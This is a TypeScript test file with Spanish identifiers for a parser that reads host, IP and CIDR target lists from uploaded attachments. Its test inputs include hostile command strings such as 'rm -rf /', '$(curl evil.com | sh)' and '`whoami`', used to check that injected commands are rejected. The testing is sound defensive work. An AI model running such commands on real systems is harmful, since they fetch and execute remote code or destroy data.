import { describe, expect, test } from 'vitest';
import { esListaDeTexto, parsearObjetivos, MAX_OBJETIVOS_LISTA } from './adjuntos.ts';

describe('esListaDeTexto', () => {
  test('acepta text/* y csv', () => {
    expect(esListaDeTexto('text/plain', 'a.txt')).toBe(true);
    expect(esListaDeTexto('text/csv', 'a.csv')).toBe(true);
  });
  test('sin mime útil, se fía de la extensión', () => {
    expect(esListaDeTexto('application/octet-stream', 'targets.list')).toBe(true);
    expect(esListaDeTexto('', 'scope.txt')).toBe(true);
    expect(esListaDeTexto('application/octet-stream', 'foto.jpg')).toBe(false);
  });
  test('rechaza binarios', () => {
    expect(esListaDeTexto('image/png', 'x.png')).toBe(false);
    expect(esListaDeTexto('application/pdf', 'x.pdf')).toBe(false);
    expect(esListaDeTexto('application/zip', 'x.zip')).toBe(false);
  });
});

describe('parsearObjetivos', () => {
  test('saca hosts/IPs/CIDR, ignora comentarios y vacías', () => {
    const txt = ['# objetivos', 'example.com', '', '10.0.0.0/24', '// nota', '192.0.2.5'].join('\n');
    const r = parsearObjetivos(txt);
    expect(r.validos).toEqual(['example.com', '10.0.0.0/24', '192.0.2.5']);
    expect(r.invalidas).toBe(0);
  });

  test('separa por comas y punto y coma también', () => {
    const r = parsearObjetivos('a.com, b.com; c.com');
    expect(r.validos).toEqual(['a.com', 'b.com', 'c.com']);
  });

  test('cuenta las inválidas y deduplica', () => {
    const r = parsearObjetivos(['example.com', 'EXAMPLE.com', 'no es un host', 'rm -rf /'].join('\n'));
    expect(r.validos).toEqual(['example.com']); // dedupe por minúsculas
    expect(r.invalidas).toBe(2);
  });

  test('trunca al tope', () => {
    const muchos = Array.from({ length: MAX_OBJETIVOS_LISTA + 10 }, (_, i) => `h${i}.example.com`).join('\n');
    const r = parsearObjetivos(muchos);
    expect(r.validos).toHaveLength(MAX_OBJETIVOS_LISTA);
    expect(r.truncado).toBe(true);
  });

  test('una inyección de comando no pasa como objetivo', () => {
    const r = parsearObjetivos('$(curl evil.com | sh)\n`whoami`\nexample.com');
    expect(r.validos).toEqual(['example.com']);
    expect(r.invalidas).toBe(2);
  });
});
